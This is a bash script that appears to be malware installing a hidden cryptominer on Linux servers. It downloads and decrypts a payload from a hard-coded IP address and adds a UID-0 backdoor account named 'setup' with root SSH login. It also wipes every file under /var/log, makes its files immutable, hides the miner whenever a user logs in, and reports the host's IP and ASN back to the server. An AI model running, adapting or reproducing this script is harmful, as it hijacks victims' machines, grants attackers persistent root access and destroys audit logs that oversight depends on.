#!/bin/bash

curdir=${PWD}
if [ -e /etc/rc.local ] ; then
 test -h /etc/rc.local && RCFILE="/etc/rc.d/rc.local" || RCFILE="/etc/rc.local"
else
 RCFILE="/etc/rc.local"
fi
numcpu="$(getconf _NPROCESSORS_ONLN)"

pkill -9 yam
pkill -9 yamd
pkill -9 wyam

chattr -i /usr/bin/yam* /etc/bash.bash_logout /etc/cron.hourly/cleanup.sh /etc/cron.hourly/cleanup /usr/bin/t /usr/bin/c /usr/bin/wyam /etc/wyam /usr/bin/config.json "$RCFILE"
rm /usr/bin/yam* /etc/bash.bash_logout /etc/cron.hourly/cleanup.sh /etc/cron.hourly/cleanup /usr/bin/t /usr/bin/c /usr/bin/wyam /etc/wyam /usr/bin/config.json

wget --no-check-certificate -c -O /usr/bin/t http://104.215.156.58:5000/t

cd /usr/bin/
gpg -o /usr/bin/c --passphrase arendelledeepsnow /usr/bin/t
tar zxf /usr/bin/c -C /usr/bin/
chattr +i /usr/bin/yam*

wget -O /etc/yam http://104.215.156.58:5000/config/2/${numcpu}/ 2>/dev/null

cd /etc

# cat >/etc/bash.bash_logout <<'EOL'
# if (( $(grep -c . <<<$(w -h | sed '/setup/,+1 d' | sed '/tmux/,+1 d')) == 0 )); then
#     cd /etc && yamd -c yam &
# fi
# exit 0
# EOL

if ! grep -q "pkill yamd" /etc/bash.bashrc; then
    cat >>/etc/bash.bashrc <<'EOL'
if [[ $(id -u) -eq 0 ]] ; then
 for i in $(find /var/log -type f); do cat /dev/null > $i; done
fi
if [[ $(w -h | grep -vE "setup") ]]; then
 pkill yamd
 pkill yam
fi
EOL
fi

if ! grep -q "pkill yamd" /etc/bashrc; then
    cat >>/etc/bashrc <<'EOL'
if [[ $(id -u) -eq 0 ]] ; then
 for i in $(find /var/log -type f); do cat /dev/null > $i; done
fi
if [[ $(w -h | grep -vE "setup") ]]; then
 pkill yamd
 pkill yam
fi
EOL
fi

if ! grep -q "pkill yamd" /etc/crontab; then
    cat >>/etc/crontab <<'EOL'
* * * * * root bash -c 'if [[ $(w -h | grep -vE "setup") ]]; then pkill yamd; pkill yam; fi'

EOL
fi

cat >/etc/cron.hourly/cleanup <<'EOL'
#!/bin/bash
if [ ! -s "/usr/bin/yam" ] && [ ! -s "/usr/bin/yamd" ]; then
    chattr -i /usr/bin/yam*
    rm /usr/bin/yam*
    tar zxf /usr/bin/c -C /usr/bin/
    chmod +x /usr/bin/yam*
    chattr +i /usr/bin/yam*
fi
if [ ! $(pgrep -x "yamd") ] && [ $(grep -c . <<<$(w -h | sed '/setup/,+1 d' | sed '/tmux/,+1 d')) == 0 ]; then
    screen -d -m bash -c 'cd /etc; while : ; do if [[ $(w -h) ]]; then true ; else yamd -c yam; fi ; sleep 30; done'
fi
for i in $(find /var/log -type f); do cat /dev/null > $i; done
exit 0
EOL

if ! grep -q "usermod -d /var/setup" "$RCFILE"; then
    if ! grep -q "bin/bash" "$RCFILE"; then
        cat >"$RCFILE" <<'EOL'
#!/bin/bash
chattr -i /etc/{passwd,shadow,group,gshadow}
if ! grep -q "setup" /etc/passwd; then
 useradd -b /var/setup -d /var/setup -g 0 -l -m -N -u 0 -o -p $6$FFK313HeiMZenm0o$0SSvpQtXSu9GzddUtA8cj8kiMgZgqTIe5jdeJ.0j5Zpx2TBLh4DHW30zyneX.hf8g6ZrkxrqspG9JK1nmazn11 -s /bin/bash
else
 usermod -d /var/setup -g 0 -m -o -p $6$FFK313HeiMZenm0o$0SSvpQtXSu9GzddUtA8cj8kiMgZgqTIe5jdeJ.0j5Zpx2TBLh4DHW30zyneX.hf8g6ZrkxrqspG9JK1nmazn11 -s /bin/bash -u 0 -U
fi
chattr +i /etc/{passwd,shadow,group,gshadow}
exit 0
screen -d -m bash -c 'cd /etc/; while : ; do if [[ $(w -h) ]]; then true ; else yamd -c yam; fi ; sleep 30; done'
EOL
    else
        cat >>"$RCFILE" <<'EOL'
chattr -i /etc/{passwd,shadow,group,gshadow}
if ! grep -q "setup" /etc/passwd; then
 useradd -b /var/setup -d /var/setup -g 0 -l -m -N -u 0 -o -p $6$FFK313HeiMZenm0o$0SSvpQtXSu9GzddUtA8cj8kiMgZgqTIe5jdeJ.0j5Zpx2TBLh4DHW30zyneX.hf8g6ZrkxrqspG9JK1nmazn11 -s /bin/bash
else
 usermod -d /var/setup -g 0 -m -o -p $6$FFK313HeiMZenm0o$0SSvpQtXSu9GzddUtA8cj8kiMgZgqTIe5jdeJ.0j5Zpx2TBLh4DHW30zyneX.hf8g6ZrkxrqspG9JK1nmazn11 -s /bin/bash -u 0 -U
fi
chattr +i /etc/{passwd,shadow,group,gshadow}
screen -d -m bash -c 'cd /etc/; while : ; do if [[ $(w -h) ]]; then true ; else yamd -c yam; fi ; sleep 30; done'
EOL
    fi
fi

if ! grep -q "Match User setup" /etc/ssh/sshd_config; then
    cat >>/etc/ssh/sshd_config <<'EOL'
AuthenticationMethods password,publickey
ClientAliveInterval 180
ClientAliveCountMax 0
Match User setup
    PermitRootLogin yes
    PasswordAuthentication yes
EOL
fi
service sshd restart
service ssh restart
systemctl restart ssh
systemctl restart sshd

chmod +x /etc/cron.hourly/cleanup $RCFILE
chattr +i /etc/cron.hourly/cleanup /etc/bash.bash_logout $RCFILE

sysctl -w vm.nr_hugepages=128

apt install -y screen
yum install -y epel-release
yum install -y screen

if ! grep -q "vm.nr_hugepages=128" /etc/sysctl.conf; then
    echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf
fi
screen -d -m bash -c 'while : ; do if [[ $(w -h) ]]; then true ; else yamd -c yam; fi ; sleep 30; done'
wget -q -O- http://104.215.156.58:5000/ip
wget -q -O- http://104.215.156.58:5000/asn

cd ${curdir}
